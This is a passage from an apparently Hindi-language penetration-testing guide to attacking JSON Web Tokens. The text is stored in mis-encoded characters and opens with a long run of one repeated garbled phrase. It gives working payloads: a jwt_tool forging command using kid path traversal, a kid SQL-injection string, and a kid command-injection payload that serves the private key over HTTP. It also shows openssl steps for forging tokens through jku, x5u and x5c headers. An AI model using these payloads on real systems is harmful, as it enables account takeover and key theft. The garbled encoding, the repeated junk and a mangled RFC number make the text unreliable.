рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ
```bash
python3 jwt_tool.py <JWT> -I -hc kid -hv "../../dev/null" -S hs256 -p ""
```
рдЬреНрдЮрд╛рдд рд╕рд╛рдордЧреНрд░реА рдХреЗ рд╕рд╛рде рд╣реЛрд╕реНрдЯ рдХреЗ рднреАрддрд░ рдлрд╛рдЗрд▓реЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЖрдк рдПрдХ рдорд╛рдиреНрдп JWT рднреА рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рд▓рд┐рдирдХреНрд╕ рд╕рд┐рд╕реНрдЯрдо рдореЗрдВ рдлрд╝рд╛рдЗрд▓ `/proc/sys/kernel/randomize_va_space` рдХреА рдорд╛рди **2** рдкрд░ рд╕реЗрдЯ рд╣реИред рдЗрд╕рд▓рд┐рдП, "**kid**" рдкреИрд░рд╛рдореАрдЯрд░ рдореЗрдВ рдЙрд╕ **рдкрде** рдХреЛ рдбрд╛рд▓рдХрд░ рдФрд░ JWT рдЙрддреНрдкрдиреНрди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП "**2**" рдХрд╛ **рд╕рдорд░реВрдкреА рдкрд╛рд╕рд╡рд░реНрдб** рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЖрдкрдХреЛ рдПрдХ рдорд╛рдиреНрдп рдирдпрд╛ JWT рдЙрддреНрдкрдиреНрди рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдПред

#### "kid" рд╕рдорд╕реНрдпрд╛рдПрдВ - SQL Injection

рдЬрд╣рд╛рдВ "kid" рдХреА рд╕рд╛рдордЧреНрд░реА рдХрд╛ рдЙрдкрдпреЛрдЧ рдбреЗрдЯрд╛рдмреЗрд╕ рд╕реЗ рдкрд╛рд╕рд╡рд░реНрдб рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЖрдк "kid" рдкреИрд░рд╛рдореАрдЯрд░ рдореЗрдВ рдкреЗрд▓реЛрдб рдХреЛ рдмрджрд▓ рд╕рдХрддреЗ рд╣реИрдВ: `non-existent-index' UNION SELECT 'ATTACKER';-- -` рдФрд░ рдлрд┐рд░ рдЧреБрдкреНрдд рдХреБрдВрдЬреА `ATTACKER` рдХреЗ рд╕рд╛рде JWT рдХреЛ рд╕рд╛рдЗрди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

#### "kid" рд╕рдорд╕реНрдпрд╛рдПрдВ - OS Injection

рдЬрд╣рд╛рдВ "kid" рдкреИрд░рд╛рдореАрдЯрд░ рдореЗрдВ рдХреБрдВрдЬреА рдХреЗ рд╕рд╛рде рдПрдХ рдлрд╝рд╛рдЗрд▓ рдХрд╛ рдкрде рд╣реЛрддрд╛ рд╣реИ рдФрд░ рдпрд╣ рдкрде **рдПрдХ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрдорд╛рдВрдб** рдХреЗ рднреАрддрд░ рдЙрдкрдпреЛрдЧ рд╣реЛ рд░рд╣рд╛ рд╣реИ, рдЖрдк RCE рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдкреЗрд▓реЛрдб рдХреЗ рд╕рд╛рде рдирд┐рдЬреА рдХреБрдВрдЬреА рдХреЛ рдЙрдЬрд╛рдЧрд░ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ: `/root/res/keys/secret7.key; cd /root/res/keys/ && python -m SimpleHTTPServer 1337&`

### рд╡рд┐рд╡рд┐рдз рд╣рдорд▓реЗ

рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЬреНрдЮрд╛рдд рдХрдордЬреЛрд░рд┐рдпрд╛рдБ рд╣реИрдВ рдЬрд┐рдирдХрд╛ рдкрд░реАрдХреНрд╖рдг рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдПред

**рдХреНрд░реЙрд╕-рд╕реЗрд╡рд╛ рд░рд┐рд▓реЗ рд╣рдорд▓реЗ**

рдХреБрдЫ рд╡реЗрдм рдЕрдиреБрдкреНрд░рдпреЛрдЧ рдПрдХ рд╡рд┐рд╢реНрд╡рд╕рдиреАрдп JWT 'рд╕реЗрд╡рд╛' рдХрд╛ рдЙрдкрдпреЛрдЧ рдЕрдкрдиреЗ рд▓рд┐рдП рдЯреЛрдХрди рдЙрддреНрдкрдиреНрди рдФрд░ рдкреНрд░рдмрдВрдзрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд░рддреЗ рд╣реИрдВред рдЗрддрд┐рд╣рд╛рд╕ рдореЗрдВ рдХреБрдЫ рдРрд╕реЗ рдорд╛рдорд▓реЗ рд╣реБрдП рд╣реИрдВ рдЬрд╣рд╛рдВ JWT рд╕реЗрд╡рд╛ рдХреЗ рдПрдХ рдЧреНрд░рд╛рд╣рдХ рдХреЗ рд▓рд┐рдП рдЙрддреНрдкрдиреНрди рдЯреЛрдХрди рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ рдЙрд╕ JWT рд╕реЗрд╡рд╛ рдХреЗ рджреВрд╕рд░реЗ рдЧреНрд░рд╛рд╣рдХ рджреНрд╡рд╛рд░рд╛ рд╕реНрд╡реАрдХрд╛рд░ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред\
рдпрджрд┐ рдЖрдк рдЯреЛрдХрди рдХреЛ рддреАрд╕рд░реА рдкрдХреНрд╖ рд╕реЗрд╡рд╛ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЬрд╛рд░реА рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рддреЛ рдпрд╣ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╣реИ рдХрд┐ рдХреНрдпрд╛ рдЖрдк рдЙрд╕реА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо / рдИрдореЗрд▓ рдХреЗ рд╕рд╛рде рджреВрд╕рд░реЗ рд╕реЗрд╡рд╛ рдХреЗ рд▓рд┐рдП рдЦрд╛рддрд╛ рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВред рдпрджрд┐ рд╣рд╛рдВ, рддреЛ рдЙрд╕ рдЯреЛрдХрди рдХреЛ рд▓реЗ рдЬрд╛рдХрд░ рдЕрдкрдиреЗ рд▓рдХреНрд╖реНрдп рдХреЛ рд░рд┐рдкреНрд▓реЗ рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░реЗрдВред рдХреНрдпрд╛ рдпрд╣ рд╕реНрд╡реАрдХрд╛рд░ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ?

* рдпрджрд┐ рдЖрдкрдХрд╛ рдЯреЛрдХрди рд╕реНрд╡реАрдХрд╛рд░ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рддреЛ рдЖрдкрдХреЗ рдкрд╛рд╕ рдХрд┐рд╕реА рднреА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдЦрд╛рддреЗ рдХреЛ рдЫрд▓рдирд╛ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рд╣реЛ рд╕рдХрддреА рд╣реИред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдпрджрд┐ рдЖрдк рддреАрд╕рд░реА рдкрдХреНрд╖ рдЕрдиреБрдкреНрд░рдпреЛрдЧ рдкрд░ рд╕рд╛рдЗрди рдЕрдк рдХрд░ рд░рд╣реЗ рд╣реИрдВ рддреЛ рдЖрдкрдХреЛ рдХрд╛рдиреВрдиреА рдЧреНрд░реЗ рдХреНрд╖реЗрддреНрд░ рдореЗрдВ рдкреНрд░рд╡реЗрд╢ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рдХреЗ рд▓рд┐рдП рд╡реНрдпрд╛рдкрдХ рдкрд░реАрдХреНрд╖рдг рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреА рдЕрдиреБрдорддрд┐ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛ рд╕рдХрддреА рд╣реИ!

**рдХреНрдпрд╛ exp рдЬрд╛рдВрдЪрд╛ рдЬрд╛рддрд╛ рд╣реИ?**

"exp" рдкреЗрд▓реЛрдб рдХреНрд▓реЗрдо рдХрд╛ рдЙрдкрдпреЛрдЧ рдЯреЛрдХрди рдХреА рд╕рдордпрд╕реАрдорд╛ рдХреА рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред JWT рдЕрдХреНрд╕рд░ рд╕рддреНрд░ рдЬрд╛рдирдХрд╛рд░реА рдХреА рдЕрдиреБрдкрд╕реНрдерд┐рддрд┐ рдореЗрдВ рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВ, рдЗрд╕рд▓рд┐рдП рдЗрдиреНрд╣реЗрдВ рд╕рддрд░реНрдХрддрд╛ рдХреЗ рд╕рд╛рде рд╣реИрдВрдбрд▓ рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдП - рдмрд╣реБрдд рд╕рд╛рд░реЗ рдорд╛рдорд▓реЛрдВ рдореЗрдВ рдХрд┐рд╕реА рдФрд░ рдХреЗ JWT рдХреЛ рдХреИрдкреНрдЪрд░ рдФрд░ рд░рд┐рдкреНрд▓реЗ рдХрд░рдиреЗ рд╕реЗ рдЖрдк рдЙрд╕ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреА рддрд░рд╣ рдмрди рд╕рдХрддреЗ рд╣реИрдВред\
JWT рдкреБрдирд░реНрдкреНрд░рд╕рд╛рд░рдг рд╣рдорд▓реЛрдВ рдХреЗ рдЦрд┐рд▓рд╛рдл рдПрдХ рд╕реБрд░рдХреНрд╖рд╛ рд╕рдВрд░рдХреНрд╖рдг (рдЬреЛ JWT RFC рджреНрд╡рд╛рд░рд╛ рд╕рд┐рдлрд╛рд░рд┐рд╢ рдХреА рдЬрд╛рддреА рд╣реИ) "exp" рдХреНрд▓реЗрдо рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЯреЛрдХрди рдХреЗ рд▓рд┐рдП рдПрдХ рд╕рдордпрд╕реАрдорд╛ рд╕реЗрдЯ рдХрд░рдирд╛ рд╣реИред рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдЯреЛрдХрди рдХреЛ рд╕рдВрдЧреНрд░рд╣реАрдд рдХрд░рдиреЗ рдФрд░ рд╕рдордпрд╕реАрдорд╛ рд╕рдорд╛рдкреНрдд рд╣реЛрдиреЗ рдХреЗ рдмрд╛рдж рдЙрд╕реЗ рд░рд┐рдкреНрд▓реЗ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрд╡рд╢реНрдпрдХ рдЬрд╛рдВрдЪреЗрдВ рд╕реЗрдЯ рдХрд░рдирд╛ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╣реИред рдпрджрд┐ рдЯреЛрдХрди рдореЗрдВ "exp" рдХреНрд▓реЗрдо рд╣реИ рдФрд░ рдкрд░реАрдХреНрд╖рдг рд╕рдордп рд╕реАрдорд╛рдПрдВ рдЗрд╕реЗ рд╕рдВрднрд╡ рдХрд░рддреА рд╣реИрдВ - рддреЛ рдЯреЛрдХрди рдХреЛ рд╕рдВрдЧреНрд░рд╣реАрдд рдХрд░реЗрдВ рдФрд░ рд╕рдордпрд╕реАрдорд╛ рд╕рдорд╛рдкреНрдд рд╣реЛрдиреЗ рдХреЗ рдмрд╛рдж рдЙрд╕реЗ рд░рд┐рдкреНрд▓реЗ рдХрд░реЗрдВред _рдЯреЛрдХрди рдХреА рд╕рд╛рдордЧреНрд░реА рдХреЛ рдкрдврд╝рдиреЗ рдХреЗ рд▓рд┐рдП jwt\_tool рдХреЗ -R рдлрд╝реНрд▓реИрдЧ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ, рдЬрд┐рд╕рдореЗрдВ рдЯрд╛рдЗрдорд╕реНрдЯреИрдореНрдк рдкрд╛рд░реНрд╕рд┐рдВрдЧ рдФрд░ рд╕рдорд╛рдкреНрддрд┐ рдЬрд╛рдВрдЪ (UTC рдореЗрдВ рдЯрд╛рдЗрдорд╕реНрдЯреИрдореНрдк) рд╢рд╛рдорд┐рд▓ рд╣реИ_

* рдпрджрд┐ рдЯреЛрдХрди рдЕрднреА рднреА рдЕрдиреБрдкреНрд░рдпреЛрдЧ рдореЗрдВ рдорд╛рдиреНрдпрддрд╛ рдкреНрд░рд╛рдкреНрдд рдХрд░рддрд╛ рд╣реИ рддреЛ рдпрд╣ рдПрдХ рд╕реБрд░рдХреНрд╖рд╛ рдЬреЛрдЦрд┐рдо рд╣реЛ рд╕рдХрддрд╛ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдЯреЛрдХрди рдХрднреА рд╕рдорд╛рдкреНрдд рдирд╣реАрдВ рд╣реЛ рд╕рдХрддрд╛ рд╣реИред

### x5u рдФрд░ jku

#### jku

jku рдХрд╛ рдЕрд░реНрде рд╣реИ **JWK рд╕реЗрдЯ URL**ред\
рдпрджрд┐ рдЯреЛрдХрди рдореЗрдВ "jku" **рд╣реИрдбрд░** рдХреНрд▓реЗрдо рд╣реИ рддреЛ **рдкреНрд░рджрд╛рди рдХреА рдЧрдИ URL** рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВред рдпрд╣ рдЬреЗрдбрдмреНрд▓реНрдпреВрдХреЗрдПрд╕ рдлрд╝рд╛рдЗрд▓ рдХреЛ рджреЗрдЦрдиреЗ рд╡рд╛рд▓рд╛ URL рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП рдЬрд┐рд╕рдореЗрдВ рдЯреЛрдХрди рдХреЛ рд╕рддреНрдпрд╛рдкрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рдХреБрдВрдЬреА рд╣реЛрддреА рд╣реИред рдЯреЛрдХрди рдХреЛ рддрдерд╛рдХрдерд┐рдд jku рдорд╛рди рдХреЛ рдПрдХ рд╡реЗрдм рд╕реЗрд╡рд╛ рдХреА рдУрд░ рджрд┐рдЦрд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдЯреЛрдХрди рдореЗрдВ рддрдерд╛рдХрдерд┐рдд рдХрд░реЗрдВред

рд╕рдмрд╕реЗ рдкрд╣рд▓реЗ, рдЖрдкрдХреЛ рдирдИ рдкреНрд░рд╛рдЗрд╡реЗрдЯ рдФрд░ рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рдХреБрдВрдЬреА рдХреЗ рд╕рд╛рде рдПрдХ рдирдпрд╛ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдмрдирд╛рдирд╛ рд╣реЛрдЧрд╛ред
```bash
openssl genrsa -out keypair.pem 2048
openssl rsa -in keypair.pem -pubout -out publickey.crt
openssl pkcs8 -topk8 -inform PEM -outform PEM -nocrypt -in keypair.pem -out pkcs8.key
```
рддрдм рдЖрдк рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП [**jwt.io**](https://jwt.io) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдирдП JWT рдХреЛ рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП **рдирдП рдЬрдирд░реЗрдЯреЗрдб рдкрдмреНрд▓рд┐рдХ рдФрд░ рдкреНрд░рд╛рдЗрд╡реЗрдЯ рдХреАрдЬрд╝ рдХреЗ рд╕рд╛рде рдФрд░ рдкреИрд░рд╛рдореАрдЯрд░ jku рдХреЛ рдмрдирд╛рдП рдЧрдП рд╕рд░реНрдЯрд┐рдлрд┐рдХреЗрдЯ рдкрд░ рдкреЙрдЗрдВрдЯ рдХрд░рддреЗ рд╣реБрдПред** рдПрдХ рд╡реИрдз jku рд╕рд░реНрдЯрд┐рдлрд┐рдХреЗрдЯ рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдк рдореВрд▓ рд╕рд░реНрдЯрд┐рдлрд┐рдХреЗрдЯ рдХреЛ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЖрд╡рд╢реНрдпрдХ рдкреИрд░рд╛рдореАрдЯрд░ рдХреЛ рдмрджрд▓ рд╕рдХрддреЗ рд╣реИрдВред

рдЖрдк рдПрдХ рдкрдмреНрд▓рд┐рдХ рд╕рд░реНрдЯрд┐рдлрд┐рдХреЗрдЯ рд╕реЗ "e" рдФрд░ "n" рдкреИрд░рд╛рдореАрдЯрд░ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
from Crypto.PublicKey import RSA
fp = open("publickey.crt", "r")
key = RSA.importKey(fp.read())
fp.close()
print("n:", hex(key.n))
print("e:", hex(key.e))
```
#### x5u

X.509 URL. рдПрдХ X.509 (рдПрдХ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдкреНрд░рд╛рд░реВрдк рдорд╛рдирдХ) рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рдкреНрд░рдорд╛рдгрдкрддреНрд░реЛрдВ рдХреЗ рд╕реЗрдЯ рдХреЛ рдЗрдВрдХреЛрдб рдХрд┐рдпрд╛ рдЧрдпрд╛ PEM рд░реВрдк рдореЗрдВ рджрд░реНрд╢рд╛рдиреЗ рд╡рд╛рд▓рд╛ рдПрдХ URIред рд╕реЗрдЯ рдореЗрдВ рдкрд╣рд▓рд╛ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рд╡рд╣ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП рдЬрд┐рд╕реЗ рдЗрд╕ JWT рдХреЛ рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдЖрдЧрд╛рдореА рдкреНрд░рдорд╛рдгрдкрддреНрд░реЛрдВ рдХреЛ рдкрд┐рдЫрд▓реЗ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдХреЗ рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдХрд░рддреЗ рд╣реИрдВ, рдЬрд┐рд╕рд╕реЗ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рд╢реНрд░реГрдВрдЦрд▓рд╛ рдкреВрд░реА рд╣реЛ рдЬрд╛рддреА рд╣реИред X.509 рдХреЛ RFC 52807 рдореЗрдВ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред рдкреНрд░рдорд╛рдгрдкрддреНрд░реЛрдВ рдХреЛ рд╕реНрдерд╛рдирд╛рдВрддрд░рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкрд░рд┐рд╡рд╣рди рд╕реБрд░рдХреНрд╖рд╛ рдЖрд╡рд╢реНрдпрдХ рд╣реЛрддреА рд╣реИред

рдЗрд╕ рд╣реИрдбрд░ рдХреЛ рдЕрдкрдиреЗ рдирд┐рдпрдВрддреНрд░рдг рдореЗрдВ рдПрдХ URL рдкрд░ рдмрджрд▓рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░реЗрдВ рдФрд░ рджреЗрдЦреЗрдВ рдХрд┐ рдХреНрдпрд╛ рдХреЛрдИ рдЕрдиреБрд░реЛрдз рдкреНрд░рд╛рдкреНрдд рд╣реЛрддрд╛ рд╣реИред рдЙрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ рдЖрдк JWT рдореЗрдВ рджрдЦрд▓ рджреЗ рд╕рдХрддреЗ рд╣реИрдВред

рдЖрдкрдХреЗ рджреНрд╡рд╛рд░рд╛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдПрдХ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ рдирдпрд╛ рдЯреЛрдХрди рдЬрд╛рд▓реА рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдЖрдкрдХреЛ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдмрдирд╛рдирд╛ рдФрд░ рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рдФрд░ рдирд┐рдЬреА рдХреБрдВрдЬреА рдирд┐рдХрд╛рд▓рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ:
```bash
openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout attacker.key -out attacker.crt
openssl x509 -pubkey -noout -in attacker.crt > publicKey.pem
```
рддрдм рдЖрдк рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП [**jwt.io**](https://jwt.io) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдирдП JWT рдХреЛ рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП **рдирдП рдкрдмреНрд▓рд┐рдХ рдФрд░ рдкреНрд░рд╛рдЗрд╡реЗрдЯ рдХреА рдФрд░ рдкреИрд░рд╛рдореАрдЯрд░ x5u рдХреЛ рдмрдирд╛рдП рдЧрдП рд╕рд░реНрдЯрд┐рдлрд┐рдХреЗрдЯ .crt рдкрд░ рдкреЙрдЗрдВрдЯ рдХрд░рддреЗ рд╣реБрдПред**

![](<../.gitbook/assets/image (439).png>)

рдЖрдк рдЗрди рджреЛрдиреЛрдВ рдЦреЛрдЬреЛрдВ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рднреА рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ **SSRF рдХреЗ рд▓рд┐рдП**ред

#### x5c

рдЗрд╕ рдкреИрд░рд╛рдореАрдЯрд░ рдореЗрдВ **рдмреЗрд╕64 рдореЗрдВ рд╕рд░реНрдЯрд┐рдлрд┐рдХреЗрдЯ** рд╣реЛ рд╕рдХрддрд╛ рд╣реИ:

![](<../.gitbook/assets/image (440).png>)

рдпрджрд┐ рд╣рдорд▓рд╛рд╡рд░ **рдПрдХ рдЖрддреНрдо-рд╕рд╛рдЗрди рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╕рд░реНрдЯрд┐рдлрд┐рдХреЗрдЯ рдмрдирд╛рддрд╛ рд╣реИ** рдФрд░ рдЙрд╕рдХреЗ рд╕рдВрдмрдВрдзрд┐рдд рдкреНрд░рд╛рдЗрд╡реЗрдЯ рдХреА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ рдЬрд╛рд▓реА рдЯреЛрдХрди рдмрдирд╛рддрд╛ рд╣реИ рдФрд░ "x5c" рдкреИрд░рд╛рдореАрдЯрд░ рдХреЗ рдорд╛рди рдХреЛ рдирдП рдЬрдирд░реЗрдЯреЗрдб рд╕рд░реНрдЯрд┐рдлрд┐рдХреЗрдЯ рд╕реЗ рдмрджрд▓рддрд╛ рд╣реИ рдФрд░ рдЕрдиреНрдп рдкреИрд░рд╛рдореАрдЯрд░реЛрдВ, рдЕрд░реНрдерд╛рддреН n, e рдФрд░ x5t рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рддрд╛ рд╣реИ, рддреЛ рдореБрдЦреНрдп рд░реВрдк рд╕реЗ рдЬрд╛рд▓реА рдЯреЛрдХрди рдХреЛ рд╕рд░реНрд╡рд░ рджреНрд╡рд╛рд░рд╛ рд╕реНрд╡реАрдХрд╛рд░ рдХрд░ рд▓рд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред
```bash
openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout attacker.key -outattacker.crt
openssl x509 -in attacker.crt -text
```
### рдПрдореНрдмреЗрдбреЗрдб рдкрдмреНрд▓рд┐рдХ рдХреА (CVE-2018-0114)

рдпрджрд┐ JWT рдореЗрдВ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╕реНрдерд┐рддрд┐ рдореЗрдВ рдПрдХ рдПрдореНрдмреЗрдбреЗрдб рдкрдмреНрд▓рд┐рдХ рдХреА рд╣реИ:

![](<../.gitbook/assets/image (438).png>)

рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдиреЛрдбрдЬреЗрдПрд╕ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЙрд╕ рдбреЗрдЯрд╛ рд╕реЗ рдПрдХ рдкрдмреНрд▓рд┐рдХ рдХреА рдЙрддреНрдкрдиреНрди рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИ:
```bash
const NodeRSA = require('node-rsa');
const fs = require('fs');
n ="тАЛANQ3hoFoDxGQMhYOAc6CHmzz6_Z20hiP1Nvl1IN6phLwBj5gLei3e4e-DDmdwQ1zOueacCun0DkX1gMtTTX36jR8CnoBRBUTmNsQ7zaL3jIU4iXeYGuy7WPZ_TQEuAO1ogVQudn2zTXEiQeh-58tuPeTVpKmqZdS3Mpum3l72GHBbqggo_1h3cyvW4j3QM49YbV35aHV3WbwZJXPzWcDoEnCM4EwnqJiKeSpxvaClxQ5nQo3h2WdnV03C5WuLWaBNhDfC_HItdcaZ3pjImAjo4jkkej6mW3eXqtmDX39uZUyvwBzreMWh6uOu9W0DMdGBbfNNWcaR5tSZEGGj2divE8"тАЛ;
e = "AQAB";
const key = new NodeRSA();
